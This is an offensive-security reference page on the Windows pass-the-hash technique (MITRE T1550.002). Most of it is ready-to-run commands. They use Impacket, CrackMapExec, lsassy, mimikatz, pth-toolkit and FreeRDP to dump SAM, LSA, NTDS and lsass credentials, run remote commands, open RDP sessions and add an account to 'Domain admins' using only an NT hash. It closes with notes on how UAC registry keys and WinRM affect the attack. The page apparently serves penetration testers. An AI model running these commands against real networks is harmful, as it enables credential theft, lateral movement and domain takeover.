# Pass the hash
MITRE ATT&CKâ„¢ Sub-technique T1550.002

An attacker knowing a user's NT hash can use it to authenticate over NTLMv1 \(pass-the-hash\) \(or indirectly over Kerberos with [overpass-the-hash](../abusing-kerberos/overpass-the-hash.md)\).

There are many tools that implement pass-the-hash: [Impacket scripts](https://github.com/SecureAuthCorp/impacket) \([psexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py), [smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py), [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)\), [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec), [FreeRDP](https://github.com/FreeRDP/FreeRDP), [mimikatz](https://github.com/gentilkiwi/mimikatz), [lsassy](https://github.com/Hackndo/lsassy), [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit)  and more.

The Impacket script [secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) has the ability to remotely dump hashes and LSA secrets from a machine \(`LMhash` can be empty\). dumping credentials from registry hives
```bash
secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
secretsdump.py -hashes ':NThash' 'DOMAIN/USER@TARGET'
secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
```

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) has the ability to do it on a set of targets. The `bh_owned` has the ability to set targets as "owned" in [BloodHound](https://github.com/BloodHoundAD/BloodHound). (dumping credentials from registry hives)
```bash
crackmapexec smb $TARGETS -u $USER -H $NThash --sam --local-auth
crackmapexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --lsa
crackmapexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --lsassy
crackmapexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash --ntds
```

[Lsassy](https://github.com/Hackndo/lsassy) has the ability to do it with higher success probabilities as it offers multiple dumping methods. This tool can set targets as "owned" in [BloodHound](https://github.com/BloodHoundAD/BloodHound). It works in standalone but also as a [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) module \(dumping credentials from lsass process memory).
```bash
crackmapexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassy
crackmapexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -M lsassy -o BLOODHOUND=True NEO4JUSER=neo4j NEO4JPASS=Somepassw0rd
lsassy -u $USER -H $NThash $TARGETS
lsassy -d $DOMAIN -u $USER -H $NThash $TARGETS
```

Some Impacket scripts enable testers to execute commands on target systems with pass-the-hash \(`LMhash` can be empty\).
```bash
psexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
smbexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
wmiexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
atexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
dcomexec.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
```

[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec) has the ability to do it on a set of targets
```bash
crackmapexec winrm $TARGETS -d $DOMAIN -u $USER -p $PASSWORD -x whoami
crackmapexec smb $TARGETS --local-auth -u $USER -H $NThash -x whoami
crackmapexec smb $TARGETS -d $DOMAIN -u $USER -H $NThash -x whoami
```

On Windows, [mimikatz](https://github.com/gentilkiwi/mimikatz) can pass-the-hash and open an elevated command prompt.
```bash
sekurlsa::pth /user:$USER /domain:$DOMAIN /ntlm:$NThash
```

The [pth-toolkit](https://github.com/byt3bl33d3r/pth-toolkit) can be used from a Linux system to operate LDAP queries, add a user to a group and so on \(`LMhash` can be `ffffffffffffffffffffffffffffffff`\).
```bash
pth-net rpc group members "Domain admins" -U 'Domain/User%LMhash:NThash' -S $DOMAIN_CONTROLLER
pth-net rpc group addmem "Domain admins" Shutdown -U 'Domain/Admin%LMhash:NThash' -S $DOMAIN_CONTROLLER
```

[FreeRDP](https://github.com/FreeRDP/FreeRDP) has the ability to do pass-the-hash for opening RDP sessions.
```bash
xfreerdp /u:$USER /d:$DOMAIN /pth:'LMhash:NThash' /v:$TARGET /h:1010 /w:1920
```

**UAC limits pass-the-hash**
UAC \(User Account Control\) limits which local users can do remote administration operations. And since most of the attacks exploiting pass-the-hash rely on remote admin operations, it affects this technique.

* the registry key `LocalAccountTokenFilterPolicy` is set to `0` by default. It means that the built-in local admin account \(RID-500, "Administrator"\) is the only local account allowed to do remote administration tasks. Setting it to `1` allows the other local admins as well.
* the registry key `FilterAdministratorToken` is set to `0` by default. It allows the built-in local admin account \(RID-500, "Administrator"\) to do remote administration tasks. If set to `1`, it doesn't.

In short, by default, only the following accounts can fully take advantage of pass-the-hash:

* **local accounts** : the built-in, RID-500, "Administrator" account
* **domain accounts** : all domain accounts with local admin rights

**WinRM enables pass-the-hash**
Testers should look out for environments with WinRM enabled. During the WinRM configuration, the `Enable-PSRemoting` sets the `LocalAccountTokenFilterPolicy` to `1`, allowing all local accounts with admin privileges to do remote admin tasks, hence allowing those accounts to fully take advantage of pass-the-hash.
